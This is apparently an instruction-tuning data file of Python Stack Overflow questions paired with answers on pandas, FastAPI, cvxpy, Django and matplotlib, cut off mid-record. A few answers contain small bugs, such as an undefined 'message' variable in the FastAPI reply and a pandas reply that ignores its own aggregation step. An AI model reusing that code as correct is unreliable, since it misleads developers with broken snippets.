{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to print 100 values which are divisible by 3 and 5?<pre><code>lower = int(input(&quot;Enter lower range limit:&quot;))\nupper = int(input(&quot;Enter upper b range limit:&quot;))\nCount = 0\nfor i in range(lower, upper+1):\n    if((i%3==0) &amp; (i%5==0)):\n    Count += 1\n    print(count)\n<\/code><\/pre>\n<p>I want to print 100 values which are divisible by 3 and 5, but in count only 7 is showing, can anyone suggest what to do, it will be appreciated!<\/p>","output_text":"<p>Use this<\/p>\n<pre><code>num = int(input(&quot;How many Numbers you want :&quot;))\n\ni=0\nCount = 0\nwhile(Count != num):\n    if((i%3==0) and (i%5==0)):\n        Count += 1\n        print(i)\n    i = i + 1\n\nprint(&quot;Count is :&quot;,Count)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Feature importance in Python using SelectKBest<p>I am trying to get the top 5 features for my dataframe df with X_train and y_train.<\/p>\n<pre><code>bestfeatures = SelectKBest(score_func=chi2, k=5) #k=5 means select top 5 features\nfit = bestfeatures.fit(X_train,y_train)\ndfscores = pd.DataFrame(fit.scores_)\ndfcolumns = pd.DataFrame(X_train.columns)\n#concat two dataframes for better visualization \nfeatureScores = pd.concat([dfcolumns,dfscores],axis=1)\nfeatureScores.columns = ['Features','Score']  #naming the dataframe columns\nprint(featureScores.nlargest(5,'Score'))  #print 5best features\n<\/code><\/pre>\n<p>Error<\/p>\n<pre><code>ValueError                                Traceback (most recent call last)\n&lt;ipython-input-54-47286ab0e6e9&gt; in &lt;module&gt;\n      6 \n      7 bestfeatures = SelectKBest(score_func=chi2, k=5)\n----&gt; 8 fit = bestfeatures.fit(X_train,y_train)\n   \n    ValueError: Unknown label type: (array([23.5, 35, 38.......\n   .......]),)      \n<\/code><\/pre>\n<p>P.S. My Y_train is 23.5 , 35, 38 and so on... as in valueerror<\/p>\n<p>How to solve this?<\/p>","output_text":"<p>Your score function is <code>chi2<\/code> so you are doing classification, not regression. You must therefore pass values in a finite space (such as: string, integer, etc.); floats can only be used for regression.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Days between dates format in print error in python<p>Calculating days between two datetimes, I have:<\/p>\n<pre><code>import datetime\n\n...\ndays_late = curr_date-last_date\ndiff_days = days_late.days\nprint(diff_days)\n<\/code><\/pre>\n<p>which prints <strong>-9<\/strong><\/p>\n<p>Then I try to format the output using:<\/p>\n<pre><code>print(&quot;Days left: {}&quot;).format(diff_days)\n<\/code><\/pre>\n<p>I get <strong>AttributeError: 'NoneType' object has no attribute 'format'<\/strong><\/p>\n<p>How can I fix it?<\/p>","output_text":"<p>You just need to format the <code>string<\/code> not the <code>print<\/code>.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>print(&quot;Days left: {}&quot;.format(diff_days))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n combine columns with different data types to make a single dateTime column in pandas data frames<p>I have imported data from some source that has date in datatype class 'object' and hour in integer and looks something like:<\/p>\n\n<pre><code>Date           Hour    Val\n2019-01-01  1   0\n2019-01-01  2   0\n2019-01-01  3   0\n2019-01-01  4   0\n2019-01-01  5   0\n2019-01-01  6   0\n2019-01-01  7   0\n2019-01-01  8   0\n<\/code><\/pre>\n\n<p>I need a single column that has the date-time in a column that looks like this:<\/p>\n\n<pre><code>DATETIME\n2019-01-01 01:00:00\n2019-01-01 02:00:00\n2019-01-01 03:00:00\n2019-01-01 04:00:00\n2019-01-01 05:00:00\n2019-01-01 06:00:00\n2019-01-01 07:00:00\n2019-01-01 08:00:00\n<\/code><\/pre>\n\n<p>I tried to convert the date column to dateTime format using <\/p>\n\n<pre><code>pd.datetime(df.Date)\n<\/code><\/pre>\n\n<p>and then using <\/p>\n\n<pre><code>df.Date.dt.hour = df.Hour\n<\/code><\/pre>\n\n<p>I get the error <\/p>\n\n<blockquote>\n  <p>ValueError: modifications to a property of a datetimelike object are not supported. Change values on the original.<\/p>\n<\/blockquote>\n\n<p>Is there an easy way to do this?<\/p>","output_text":"<p>Use <a href=\"https:\/\/www.google.com\/search?q=pandas.to_datetime&amp;rlz=1C1CHBF_en-GBGB811GB811&amp;oq=pandas.to_datetime&amp;aqs=chrome..69i57j0l7.2765j0j4&amp;sourceid=chrome&amp;ie=UTF-8\" rel=\"nofollow noreferrer\"><code>pandas.to_timedelta<\/code><\/a> and <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.to_timedelta.html\" rel=\"nofollow noreferrer\"><code>pandas.to_datetime<\/code><\/a>:<\/p>\n\n<pre><code># if needed\ndf['Date'] = pd.to_datetime(df['Date'])\n\ndf['Datetime'] = df['Date'] + pd.to_timedelta(df['Hour'], unit='H')\n<\/code><\/pre>\n\n<p>[out]<\/p>\n\n<pre><code>        Date  Hour  Val            Datetime\n0 2019-01-01     1    0 2019-01-01 01:00:00\n1 2019-01-01     2    0 2019-01-01 02:00:00\n2 2019-01-01     3    0 2019-01-01 03:00:00\n3 2019-01-01     4    0 2019-01-01 04:00:00\n4 2019-01-01     5    0 2019-01-01 05:00:00\n5 2019-01-01     6    0 2019-01-01 06:00:00\n6 2019-01-01     7    0 2019-01-01 07:00:00\n7 2019-01-01     8    0 2019-01-01 08:00:00\n<\/code><\/pre>\n\n<hr>\n\n<p>Since you asked for a method combining the columns and using a single <code>pd.to_datetime<\/code> call, you could do:<\/p>\n\n<pre><code>df['Datetime'] = pd.to_datetime((df['Date'].astype(str) + ' ' +\n                                 df['Hour'].astype(str)),\n                                 format='%Y-%m-%d %I')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Replicate each row in pandas dataframe and change values of some columns based on a list<p>Suppose I have a pandas dataframe like this:<\/p>\n<pre><code>     my_id    val_a_b    val_a    val_c\n0     id_1    rat|white   rat      1\n1     id_2    dog|brown   dog      0\n<\/code><\/pre>\n<p>and a list like this:<\/p>\n<pre><code>val_a_list = ['rat', 'dog', 'cow']\n<\/code><\/pre>\n<p>I want to replicate each row multiple times and replace the value in columns <code>val_a_b<\/code> and <code>val_a<\/code> based on each value in <code>val_a_list<\/code> (except when the value in <code>val_a<\/code> is the same as the element in <code>val_a_list<\/code>), keeping the values of all the other columns the same.<\/p>\n<p>desired dataframe:<\/p>\n<pre><code>     my_id    val_a_b    val_a    val_c\n0     id_1    rat|white   rat      1\n1     id_2    dog|brown   dog      0\n2     id_1    dog|white   dog      1\n3     id_1    cow|white   cow      1  \n4     id_2    rat|brown   rat      0\n5     id_2    cow|brown   cow      0\n<\/code><\/pre>\n<p>Note: rows 2 and 3 are based on row 0 and rows 4 and 5 are based on row 1.<\/p>\n<p>This is the code I have, which iterates over each row. I'm looking for a better solution:<\/p>\n<pre><code>def replicate_val_a_in_df(df, val_a_list):\n    df_base_size = df.shape[0]\n    for i in range(df_base_size):\n        for new_val_a in val_a_list:\n            val_a_b = df.iloc[i]['val_a_b']\n            val_a_b_parts = val_a_b.split('|')\n            original_val_a = val_a_b_parts[0]\n            if new_val_a != original_val_a:\n                val_b = val_a_b_parts[1]\n                new_val_a_b = &quot;|&quot;.join([new_val_a, val_b])\n                df.append(df.iloc[i], ignore_index=True)\n                df.iloc[-1, df.columns.get_loc('val_a')] = new_val_a\n                df.iloc[-1, df.columns.get_loc('val_a_b')] = new_val_a_b\n    return df\n<\/code><\/pre>\n<p>I have looked at <a href=\"https:\/\/stackoverflow.com\/questions\/49674219\/create-duplicate-rows-and-change-values-in-specific-columns\">this answer<\/a> but it sets the same column value in all the duplicate rows<\/p>","output_text":"<p>IIUC you can create a <code>dict<\/code> so you can <code>map<\/code> and <code>explode<\/code>, and finally reconstruct column b:<\/p>\n<pre><code>d = {i: val_a_list for i in val_a_list}\ndf = df.assign(val_a=df[&quot;val_a&quot;].map(d).fillna(df[&quot;val_a&quot;])).explode(&quot;val_a&quot;)\ndf[&quot;val_a_b&quot;] = df[&quot;val_a&quot;]+&quot;|&quot;+df[&quot;val_a_b&quot;].str.split(&quot;|&quot;).str[-1]\n\nprint (df)\n\n  my_id    val_a_b val_a  val_c\n0  id_1  rat|white   rat      1\n0  id_1  dog|white   dog      1\n0  id_1  cow|white   cow      1\n1  id_2  rat|brown   rat      0\n1  id_2  dog|brown   dog      0\n1  id_2  cow|brown   cow      0\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n FastAPI read&write from file<p>I started to learn python and I encountered a little problem.\nI try to create little chat using FastAPI with only 2 requests, get(msg) &amp; post(msg).<\/p>\n<p>The massage using BaseModel from pydantic so it have 2 fields : nickname &amp; massage content<\/p>\n<p>If I use local db from the code it works fine ( I insert with post to dict then move it to the DB ) and it presented it nice and Json like.<\/p>\n<p>But I want to use file and not local db, the problems I encountered are :<\/p>\n<ol>\n<li>Can't make the write takes both fields ( it takes only nickname\\massage )<\/li>\n<li>It doesn't look like JSON.<\/li>\n<\/ol>\n<h2>that the code I wrote : ( the # is the part I used DB which worked fine )<\/h2>\n<pre><code>from fastapi import FastAPI\nfrom pydantic import BaseModel\n\napp = FastAPI()\n\n#db = []\n\nclass Text(BaseModel):\n    nickname:str\n    text:str\n\n@app.get('\/')\ndef index():\n    return {'key' : 'value'}\n\n@app.get('\/chat\/recieve')\ndef recieve_massages():\n#    return db\n    with open('chat.txt',mode='r') as myfile:\n        return myfile.readlines()\n\n@app.post('\/chat\/send')\ndef send_massage(massage: Text):\n#    db.append(massage.dict())\n#    return db[-1]\n    with open('chat.txt',mode='a') as myfile:\n        return myfile.write(massage)\n<\/code><\/pre>\n<hr \/>","output_text":"<p>You can write <a href=\"https:\/\/en.wikipedia.org\/wiki\/JSON_streaming#Line-delimited_JSON_2\" rel=\"nofollow noreferrer\">Line-demited JSON<\/a> to the file:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import json\n\n@app.get('\/chat\/recieve')\ndef recieve_messages():\n    with open('chat.txt',mode='r') as myfile:\n        return [json.loads(i) for i in myfile.readlines()]\n\n@app.post('\/chat\/send')\ndef send_message(massage: Text):\n    with open('chat.txt',mode='a') as myfile:\n        return myfile.write(message.json()+'\\n') #Make sure there is a line between the records\n<\/code><\/pre>\n<p>If the data you need to store gets more complex, consider using a proper database like <a href=\"https:\/\/docs.python.org\/3\/library\/sqlite3.html\" rel=\"nofollow noreferrer\">sqllite<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n ValueError: setting an array element with a sequence in CVXPY minimize function<p>I tried to solve a convex problem with cvxpy as below.<\/p>\n\n<pre><code>        import cvxpy as cp\n        import numpy as np\n\n        # Problem data.\n        Q = np.array([[13, 12, -2], [12, 17, 6], [-2, 6, 12]])\n        q = np.array([[-22, -14.5, 13]])\n        r = 1\n\n        # Construct the problem.\n        x = cp.Variable((3,1))\n        objective = cp.Minimize(np.dot(np.dot(x.T, Q), x) + np.dot(q, x) + r)\n\n        constraints = [0 &lt;= x[0:], x[0:] &lt;= 1]\n        prob = cp.Problem(objective, constraints)\n\n        # The optimal objective value is returned by `prob.solve()`.\n        result = prob.solve()\n        # The optimal value for x is stored in `x.value`.\n        print(x.value)\n        # The optimal Lagrange multiplier for a constraint is stored in\n        # `constraint.dual_value`.\n        print(constraints[0].dual_value)\n<\/code><\/pre>\n\n<p>However, I get this error:<\/p>\n\n<pre><code>        ValueError: setting an array element with a sequence.\n<\/code><\/pre>\n\n<p>I don't know why this error occurs because everything else seems to work.<\/p>\n\n<p>Edit: Please let me know if the problem statement is needed.<\/p>","output_text":"<p>See comments above:<\/p>\n\n<pre><code>import cvxpy as cp\nimport numpy as np\n\n# Problem data.\nQ = np.array([[13, 12, -2], [12, 17, 6], [-2, 6, 12]])\nq = np.array([[-22, -14.5, 13]])\nr = 1\n\n# Construct the problem.\nx = cp.Variable((3,1))\n\n# WE CAN'T USE NUMPY'S DOT\n# ALSO: WE WANT TO EXPRESS AS MUCH STRUCTURE AS POSSIBLE -&gt; cp.quad_form()!\n# q*x is cvxpy-compatible expression -&gt; quite algebraic compared to numpy\n# -------------------------------------------------------------------------\nobjective = cp.Minimize(cp.quad_form(x, Q) + q*x + r)\n\n# ORIGINAL SLICING IS A NO-OP\n# ---------------------------\nconstraints = [0 &lt;= x, x &lt;= 1]\n\nprob = cp.Problem(objective, constraints)\n\n        # The optimal objective value is returned by `prob.solve()`.\nresult = prob.solve()\n        # The optimal value for x is stored in `x.value`.\nprint(x.value)\n        # The optimal Lagrange multiplier for a constraint is stored in\n        # `constraint.dual_value`.\nprint(constraints[0].dual_value)\n<\/code><\/pre>\n\n<p>Output:<\/p>\n\n<pre><code>[[ 8.46153846e-01]\n[-6.34467676e-25]\n[-1.92032635e-25]]\n[[0.        ]\n[5.80769231]\n[9.61538462]]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pushbullet, push request successfully sent but no email arrives in inbox?<p>My code sends notifications but doesn't send emails. I receive the notifications in the Pushbullet extension in Google Chrome, but not in my email inbox. No errors (e.g. 404, 405 etc.) are returned. <\/p>\n\n<p>I'm using Python3. <\/p>\n\n<p>This is the data sent (<code>email<\/code> holds the email address I've passed to the function):<\/p>\n\n<pre><code>data_send = {\n            \"email\": email,\n            \"type\": \"note\",\n            \"title\": \"Title\",\n            \"body\": \"Message\"\n        }\n<\/code><\/pre>\n\n<p>This is the request:<\/p>\n\n<pre><code>resp = requests.post('https:\/\/api.pushbullet.com\/v2\/pushes',\n                             data=json.dumps(data_send),\n                             headers={'Authorization': 'Bearer ' +\n                                      self.ACCESS_TOKEN,\n                                      'Content-Type': 'application\/json'})\n<\/code><\/pre>\n\n<p>This is what I set up so if there's any errors it'll print it out on console:<\/p>\n\n<pre><code>if resp.status_code != 200:\n            raise Exception('Something wrong')\n        else:\n            print(resp.text)\n<\/code><\/pre>\n\n<p>When I run it, I get this response (I've xx'd out any personal details and copied it here like this so because it's easier to see than in the code format):<\/p>\n\n<p>{\"active\":true,\"iden\":\"xxxxxx\",\"created\":xxxxxx,\"modified\":xxxxxx,\"type\":\"note\",\"dismissed\":false,\"direction\":\"self\",\"sender_iden\":\"xxxxxx\",\"sender_email\":\"xxxxxx\",\"sender_email_normalized\":\"xxxxxx\",\"sender_name\":\"xxxxxx\",\"receiver_iden\":\"xxxxxx\",\"receiver_email\":\"xxxxxxxx\",\"receiver_email_normalized\":\"xxxxxx\",\"title\":\"Title\",\"body\":\"Message\"}<\/p>\n\n<p>Plus, I get the notification in my Pushbullet extension in Google Chrome. But the email still hasn't arrived in my email. <\/p>\n\n<p>The Pushbullet API documentation says to set target as \"email\". Ways I have tried to implement this:<\/p>\n\n<pre><code>data_send = {\n            \"target\": \"email\",\n            \"type\": \"note\",\n            \"title\": \"Title\",\n            \"body\": \"Message\"\n        }\n<\/code><\/pre>\n\n<p>and <\/p>\n\n<pre><code>data_send = {\n            \"target\": {\"email\": email},\n            \"type\": \"note\",\n            \"title\": \"Title\",\n            \"body\": \"Message\"\n        }\n<\/code><\/pre>\n\n<p>and <\/p>\n\n<pre><code>data_send = {\n            \"type\": \"note\",\n            \"title\": \"Title\",\n            \"body\": \"Message\"\n        }\ndata_send[\"target\"] = \"email\"\n<\/code><\/pre>\n\n<p>None of these work.<\/p>\n\n<p>I understand there may be issues with sending emails to other email addresses because of spam, but sending an email to myself should work. And if it doesn't send an email to the specified email address, it is supposed to send an email to the email address associated with my account (the same email address).<\/p>\n\n<p>Is it just meant to take a long time? It's been a few hours since the email was supposed to have been sent.<\/p>\n\n<p>I have looked at other questions on SO and the most related ones seem to be <a href=\"https:\/\/stackoverflow.com\/questions\/30470785\/send-post-request-in-php-to-pushbullet-api-401-error\">this one<\/a> and <a href=\"https:\/\/stackoverflow.com\/questions\/31205100\/send-email-to-pushbullet\/31524901#31524901\">this one<\/a>.<\/p>\n\n<p>Both questions don't really help in this particular scenario as they have no mention about having no errors but email not being received. <\/p>\n\n<p>Apologies if this is long, please let me know if this question is not appropriate\/goes against guidelines. <\/p>\n\n<p>Edit: I realised if the email was the same as the one associated with my account, it might only end up sending the notification and not the email since Pushbullet detects I have an account with that email. I have tried to make the email an email different to the one associated with my account. However, doing this still doesn't work. <\/p>\n\n<p>Edit2: When I try to send an email to an external email, that email appears in the conversations list when I visit the Pushbullet website. When I go to settings > people, the email appears when I run my program. The email still doesn't arrive in their inbox.<\/p>\n\n<p>TLDR: Is my code just not picking up an error I'm not seeing? Or does Pushbullet usually take more than a few hours to send emails?<\/p>","output_text":"<p>Developer confirmed email has been disabled in a reddit post. \nThe Pushbullet website links to this subreddit. <\/p>\n\n<p><a href=\"https:\/\/www.reddit.com\/r\/PushBullet\/comments\/gs5jz9\/api_sending_emails_not_working\/\" rel=\"nofollow noreferrer\">https:\/\/www.reddit.com\/r\/PushBullet\/comments\/gs5jz9\/api_sending_emails_not_working\/<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n how to fix int not subscriptable<p>i'm currently working with two arrays that contain coordinates respectively. I want to create a Rectangle with the values of these coordinates (this is only a snippet of the code but it's where the problem seems to be):<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for j in range(0, len(sub_x)):\n        aux_x = sub_x[j]\n        aux_y = sub_y[j]\n        int_x = int(aux_x)\n        int_y = int(aux_y)\n        print(&quot;ints: &quot;, int_x, int_y)\n        rectangle = Rectangle(int_x, int_y,1,1)\n        ax.add_patch(rectangle)\n\n<\/code><\/pre>\n<p>I'm getting &quot;TypeError: 'int' object is not subscriptable&quot; in the line with the declaration of the rectangle. I created all of the auxiliary variables to be extra sure that i wasn't subscripting the int. Can anyone tell what's going on?<\/p>\n<p>Edit: Full traceback:\n&quot; File &quot;\/Library\/Frameworks\/Python.framework\/Versions\/3.9\/lib\/python3.9\/site-packages\/matplotlib\/patches.py&quot;, line 728, in <strong>init<\/strong>\nself._x0 = xy[0]\nTypeError: 'int' object is not subscriptable&quot;\nRectangle is imported from matplotlib like so:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from matplotlib.patches import Rectangle\n<\/code><\/pre>","output_text":"<p>Per the matplotlib doc: <a href=\"https:\/\/matplotlib.org\/stable\/api\/_as_gen\/matplotlib.patches.Rectangle.html\" rel=\"nofollow noreferrer\">https:\/\/matplotlib.org\/stable\/api\/_as_gen\/matplotlib.patches.Rectangle.html<\/a><\/p>\n<p>the <code>xy<\/code> parameter to <code>Rectangle<\/code> should be a tuple, not two different parameters; that's the thing that's being subscripted (inside the constructor).  This should work:<\/p>\n<pre><code>for xy in zip(sub_x, sub_y):\n    ax.add_patch(Rectangle(xy, 1, 1))\n<\/code><\/pre>\n<p>Note that <code>zip<\/code>ping <code>sub_x<\/code> and <code>sub_y<\/code> together gives you <code>x, y<\/code> tuples in exactly the form that you need them for the <code>Rectangle<\/code> constructor.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n In Numba, how can I invoke a recursive function running on the GPU?<p>According to the docs, calling a recursive function seems supported. But I try it out with a simple example, it fails:<\/p>\n<pre><code>@cuda.jit\ndef call_recursive(out):\n    out[0] = recursive(0)\n\n\n@cuda.jit(types.int64(types.int64), device=True)\ndef recursive(val):\n    if val == 10:\n        return val\n    else:\n        return recursive(val + 1)\n\n# copy an array into the device where we will store the output\ndata = np.zeros(1)\nd_data = cuda.to_device(data)\n\n# invoking kernel with one block and thread, just for testing\ncall_recursive[1,1](d_data)\n\n# get the data back\nh_data = cuda.to_host(d_data)\n\nprint(h_data[0])\n<\/code><\/pre>\n<p>In this case all I do is call a function that calls a recursive function. That one calls itself 10 times and then returns a number, that is stored in the given array and returned to the host.<\/p>\n<p>I was expecting the host to receive the populated array and print <code>10<\/code>. Instead, I see this error:<\/p>\n<pre><code>numba.core.errors.TypingError: Failed in nopython mode pipeline (step: nopython frontend)\nNameError: name 'recursive' is not defined\n<\/code><\/pre>\n<p>I'm on Python 3.7 and Numba 0.50.1, the latest.<\/p>\n<p>Any help is greatly appreciated!<\/p>","output_text":"<p>Ah, just found out it apparently is not supported. The doc I was reading was a proposal for enhancement - not actual documentation.<\/p>\n<p>Gotta simulate recursion using an iteration and a stack or an array to keep state.<\/p>\n<p>Well, hope this helps someone.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I fix erroos.rename() error [WinError 123] The filename, directory name, or volume label syntax is incorrect<p>I'm trying to rename a file and append the datetime to the file name:<\/p>\n\n<pre><code>current_date = datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S')\n\nos.rename(r'C:\\Users\\xxx\\test.csv',\n          r'C:\\Users\\xxx\\test__' + str(current_date) + '.csv')\n\n<\/code><\/pre>\n\n<p>error:<\/p>\n\n<pre><code>OSError: [WinError 123] The filename, directory name, or volume label syntax is incorrect\n<\/code><\/pre>\n\n<p>I also tried:<\/p>\n\n<pre><code>current_date = datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S')\n\nold = 'C:\/Users\/xxx\/test.csv'\nnew = 'C:\/Users\/xxx\/test_' + str(current_date) + '.csv'\nos.rename(old, new)\n<\/code><\/pre>\n\n<p>Still got the same error, can someone help me please. This script will run in a docker container, I suspect if I can't rename a local file, can I just rename it in the docker image? But I assume the datetime part will be more complicated. I've been struggling for a whole week now. Can someone help me thanks in advance.<\/p>","output_text":"<p>It's the colons that are the likely problem.\nReplace:<\/p>\n\n<p>current_date = datetime.datetime.today().strftime('%Y_%m_%d_%H:%M:%S')<\/p>\n\n<p>with:<\/p>\n\n<p>current_date = datetime.datetime.today().strftime('%Y_%m_%d_%H_%M_%S')<\/p>\n\n<p>You shouldn't have colons or spaces in a filename ideally.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Top 3 most common values using groupby<p>I have the following dataframe:<\/p>\n<pre><code>Client_id   Product_id    Product_description     quantity\n001           1353            orange                10\n001           1353            orange                10\n001           1354            lime                  5\n001           1200            pen                   1\n\n004           1354            orange                10\n...\n<\/code><\/pre>\n<p>I would like to obtain a dataframe that, for each customer, reports the top-3 most sold products (hence, with dimensions (n_customers x 4) ):<\/p>\n<pre><code>Client_id   product_id_1    product_description_1   product_id_2    product_description_2    product_id_3    product_description_3 \n001               1353            orange                 1354                lime               1200                   pen\n...\n<\/code><\/pre>\n<p>How can I create that type of dataframe?<\/p>","output_text":"<p>Try this:<\/p>\n<pre><code># Group by, so that no duplicates across the variables of interest exist\ntmp = df.groupby([&quot;client_id&quot;, &quot;product_id&quot;, &quot;product_description&quot;], as_index=False\n                         ).agg({&quot;quantity&quot;:&quot;sum&quot;})\n\n\n# Get the top 3 products per client based on quantity\ntmp = df.sort_values(['client_id', 'quantity'], ascending=[True, False]).groupby('client_id').head(3)\ntmp['order'] = (tmp.groupby('client_id').cumcount() + 1)\ntmp = tmp.set_index(['client_id', 'order']).unstack()\n\n\n# Rename the columns to match your desired format\ncols1 = pd.MultiIndex.from_product([[1,2,3], ['product_id', 'product_description']]).swaplevel()\ncols2 = cols1.get_level_values(0) + '_' + cols1.get_level_values(1).astype('str')\nresult = tmp[cols1].set_axis(cols2, axis=1)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Use different decimal separators for frontend validation in Django Admin interface<p>I looked through every single similar question on stackoverflow and tried nearly everything.\nIt seems easy to do: I just want to allow <code>,<\/code> as decimal separator for a <code>FloatField<\/code> in the Django admin interface. At the moment, it depends on the localization, but I always want to allow it. It would even be ok for me, if it's just a <code>TextInput<\/code>, but I need <code>,<\/code> to work. Setting <code>DECIMAL_SEPARATOR<\/code> in settings.py does not work.<\/p>\n<p>My question is similar to this 6 year old, unanswered one: <a href=\"https:\/\/stackoverflow.com\/questions\/29430397\/how-to-only-override-decimal-separator-in-django-while-keeping-localization-inta?rq=1\">How to only override DECIMAL_SEPARATOR in django while keeping localization intact?<\/a><\/p>\n<p>I managed to use the <code>TextInput<\/code> widget for FloatFields like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class ExampleAdminForm(forms.ModelForm):\n    class Meta:\n        model = Example\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        for key, value in self.fields.items():\n            if isinstance(value, FloatField):\n                self.fields[key].widget = TextInput()  \n<\/code><\/pre>\n<p>The widget works, but an input like <code>1,23<\/code> leads to an error message <code>Enter a number<\/code>. I'd have to implement my own, custom FloatField that overrides the sanitizing in <code>to_python<\/code> to allow for differenct decimal separators, but then I'd still need a different widget. This seems awfully complicated, is there a better way?\nIf not, how can I change the frontend validation in the widget to ignore localization and use my own regex pattern?<\/p>","output_text":"<p>Patch the <code>to_python<\/code> method, or use a custom form field class that overrides that method.<\/p>\n<p>One-liner answer:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>self.fields[key].to_python = lambda v: self.fields[key].__class__.to_python(self.fields[key], '.'.join(v.rsplit(',', 1)) if len(v.rsplit(',', 1)[-1]) &lt; 3 else v)\n<\/code><\/pre>\n<p>As a wrapper function:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>self.fields[key].to_python = allow_comma_decimal_separator(self.fields[key].to_python)\n<\/code><\/pre>\n<pre class=\"lang-py prettyprint-override\"><code>def allow_comma_decimal_separator(old_to_python):\n    def to_python(value):\n        if ',' in value:\n            lvalue, decimals = value.rsplit(',', 1)\n            if len(decimals) &lt; 3:\n                value = '.'.join((lvalue, decimals))\n        return old_to_python(value)\n    return to_python\n<\/code><\/pre>\n<p>i.e. If a comma is in the value, and the substring after the rightmost comma has a length of less than 3 (so we assume it's not a thousand separator), then we replace that comma with a period by joining the substring before and after with a period.<\/p>\n<h1>For explicit fields using a reusable form field class<\/h1>\n<p>This would be considered less &quot;hacky&quot;.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class AllowCommaDecimalSeparatorFloatField(forms.FloatField):\n\n    def to_python(self, value):\n        if ',' in value:\n            lvalue, decimals = value.rsplit(',', 1)\n            if len(decimals) &lt; 3:\n                value = '.'.join((lvalue, decimals))\n        return super().to_python(value)\n<\/code><\/pre>\n<p>In your form's <code>Meta<\/code> class:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>field_classes = {\n    'myfield': AllowCommaDecimalSeparatorFloatField,\n}\n<\/code><\/pre>\n<h1>For all FloatFields<\/h1>\n<p>To affect all <code>FloatField<\/code> instances (not instantiated yet), place this at the top of your module:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>old_to_python = forms.FloatField.to_python\n\n\ndef to_python(self, value):\n    if ',' in value:\n        lvalue, decimals = value.rsplit(',', 1)\n        if len(decimals) &lt; 3:\n            value = '.'.join((lvalue, decimals))\n    return old_to_python(self, value)\n\n\nforms.FloatField.to_python = to_python\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Inserting pandas_market_calendars time value into pandas timestamp value<p>With the <code>start_of_day()<\/code> function below, I'm attempting to return timestamps of the NYSE market open date and time for the current week.  I am not using this in a pandas dataframe, I'm just using pandas time functions because they're some of the only functions that I've found that are specific to market dates and times that incorporate holidays.<\/p>\n<p>In this particular case, I'm trying to return timestamps of:<\/p>\n<pre><code>2022-01-18 09:30:00\n2022-01-19 09:30:00\n2022-01-20 09:30:00\n2022-01-21 09:30:00\n<\/code><\/pre>\n<p>(Above would not return <code>2022-01-17 09:30:00<\/code> because it was a holiday)<\/p>\n<p>code:<\/p>\n<pre><code># test.py\n\nimport pandas_market_calendars as mcal\nimport pandas\nimport time\nnow = pandas.Timestamp.now()\n\ndef start_of_week(multiplier, format='ms'):\n    obj = now + pandas.tseries.offsets.Week(multiplier, weekday=0)\n    obj = pandas.Timestamp(obj).floor(freq='D')\n    if format == 'ms':\n        obj = int(time.mktime(obj.timetuple()) * 1000)\n    return(obj)\nprint(start_of_week(-4))\n\ndef start_of_day():\n    nyse = mcal.get_calendar('NYSE')\n    print(f'type: {type(nyse.open_time)}')\n    print(f'time: {nyse.open_time}')\n    market_days = nyse.schedule(start_date=start_of_week(-1, None), end_date=now)\n    for date in market_days.index.to_list():\n        print(f'type: {type(date)}')\n        print(f'date: {date}')\n        print(f'time pieces: {nyse.open_time.hour} {nyse.open_time.minute} {nyse.open_time.second}')\n        print(f'new timestamp: {pandas.Timestamp(date, hour=nyse.open_time.hour, minute=nyse.open_time.minute, second=nyse.open_time.second)}')\nstart_of_day()\n<\/code><\/pre>\n<pre><code># python3 test.py\n1640581200000\ntype: &lt;class 'datetime.time'&gt;\ntime: 09:30:00\ntype: &lt;class 'pandas._libs.tslibs.timestamps.Timestamp'&gt;\ndate: 2022-01-18 00:00:00\ntime pieces: 9 30 0\n2022-01-18 00:00:00\ntype: &lt;class 'pandas._libs.tslibs.timestamps.Timestamp'&gt;\ndate: 2022-01-19 00:00:00\ntime pieces: 9 30 0\n2022-01-19 